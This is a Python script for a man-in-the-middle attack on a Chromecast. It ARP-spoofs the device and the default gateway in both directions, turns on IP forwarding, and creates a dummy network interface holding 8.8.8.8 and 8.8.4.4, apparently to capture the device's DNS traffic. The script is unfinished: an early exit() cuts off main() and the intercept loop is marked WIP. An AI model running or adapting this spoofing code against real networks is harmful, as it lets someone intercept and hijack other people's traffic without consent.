import time
import os
import sys
import spoofer
import _thread


def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distros
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            return
    with open(file_path, "w") as f:
        print(1, file=f)


def thread_spoof(target1, target2):
    target_mac = spoofer.get_mac(target1)
    while True:
        spoofer.spoof(target1, target2, target_mac)
        time.sleep(1)



def argParser():
    if len(sys.argv) < 2:
        print("Please call script with the ip of your chromecast")
        exit()
    elif len(sys.argv) < 3:
        tmp = sys.argv[1].split('.')
        target2 = tmp[0] + "." + tmp[1] + "." + tmp[2] + ".1"
        print("Assuming default gateway is: " + target2)
        print("If this is not correct please supply the ip for the default gateway as an argument")
    else:
        target2 = sys.argv[2]

    target1 = sys.argv[1]

    return target1, target2


def main():
    targets = argParser()
    exit()
    print("----------------------------------")
    print("Creating Virtual NIC eth10 with ip: 8.8.8.8 & 8.8.4.4")
    bash = "modprobe dummy && ip link add eth10 type dummy && ip addr add 8.8.8.8/0 brd + dev eth10 label eth10:0 && ip addr add 8.8.4.4/0 brd + dev eth10 label eth10:1"
    os.system(bash)
    bash = "ip a | grep -w inet"
    os.system(bash)
    print("Dummy NICs created")
    print("----------------------------------")

    print("Starting ARP spoofer thread...")
    _thread.start_new_thread(thread_spoof, (targets[0], targets[1]))
    _thread.start_new_thread(thread_spoof, (targets[1], targets[0]))
    print("Success!")
    print("----------------------------------")

    try:
        while True:
            #WIP
            pass
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        bash = "ip link delete eth10 type dummy"
        os.system(bash)
        spoofer.restore(targets[0], targets[1])
        spoofer.restore(targets[1], targets[0])


if __name__ == '__main__':
    if "nt" in os.name:
        exit()
    else:
        _enable_linux_iproute()
        main()
